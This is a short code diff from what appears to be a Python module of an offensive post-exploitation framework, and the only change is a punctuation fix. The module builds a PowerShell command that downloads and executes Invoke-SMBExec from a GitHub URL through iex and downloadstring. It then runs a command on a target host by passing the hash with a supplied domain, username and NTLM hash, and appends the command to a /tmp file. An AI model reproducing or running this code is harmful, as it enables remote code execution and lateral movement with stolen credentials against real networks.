@@ -35,7 +35,7 @@ class CustomModule(Module):
                 break
 
         if warrior_exist:
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1')"
+            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1');"
             function += 'Invoke-SMBExec -Target {} -Domain {} -Username {} -Hash {} -Command "{}"'.format(self.args["target"],self.args["domain"],self.args["username"],self.args["hash"],self.args["command"])
 
             with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
